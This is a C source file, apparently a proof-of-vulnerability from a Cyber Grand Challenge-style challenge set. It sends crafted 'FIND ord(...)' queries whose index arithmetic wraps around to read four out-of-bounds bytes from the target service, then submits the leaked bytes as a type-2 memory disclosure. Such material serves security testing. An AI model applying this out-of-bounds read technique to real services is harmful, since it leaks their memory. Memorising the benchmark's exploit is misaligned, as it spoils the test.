/*

Author: Bryce Kerley <bryce@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libpov.h>
#include "types.h"
#include "protocol.h"

unsigned char t2buf[4];
type2_vals t2_vals;

unsigned char atoi(unsigned char* buf, uint16 len) {
  unsigned char run = 0;
  uint16 i = 0;
  while ((i < len) && (0 != buf[i])) {
    run *= 10;
    run += buf[i] - '0';
    i++;
  }

  return run;
}

int main(void) {
  type2_negotiate(&t2_vals);
  protocol_consume_str();
  
  transmit(STDERR, "1", 1, NULL);
  protocol_send_str("FIND ord('x', 0 - 29881 * 65536 + 74513) FROM x");
  transmit(STDERR, "\n", 1, NULL);
  protocol_with_recv_string(^(uint16 len, char* str) {
      unsigned char* ustr = (unsigned char*)str;
      t2buf[0] = atoi(ustr, len);
    });
  
  transmit(STDERR, "2", 1, NULL);
  protocol_send_str("FIND ord('x', 0 - 29881 * 65536 + 73378) FROM x");
  transmit(STDERR, "\n", 1, NULL);
  protocol_with_recv_string(^(uint16 len, char* str) {
      unsigned char* ustr = (unsigned char*)str;
      t2buf[1] = atoi(ustr, len);
    });

  transmit(STDERR, "3", 1, NULL);
  protocol_send_str("FIND ord('x', 0 - 29881 * 65536 + 72243) FROM x");
  transmit(STDERR, "\n", 1, NULL);
  protocol_with_recv_string(^(uint16 len, char* str) {
      unsigned char* ustr = (unsigned char*)str;
      t2buf[2] = atoi(ustr, len);
    });

  transmit(STDERR, "4", 1, NULL);
  protocol_send_str("FIND ord('x', 0 - 29881 * 65536 + 78292) FROM x");
  transmit(STDERR, "\n", 1, NULL);
  protocol_with_recv_string(^(uint16 len, char* str) {
      unsigned char* ustr = (unsigned char*)str;
      t2buf[3] = atoi(ustr, len);
    });

  const unsigned char* t2buf_addr = (unsigned char*) &t2buf;
  type2_submit(t2buf_addr, 4);
}



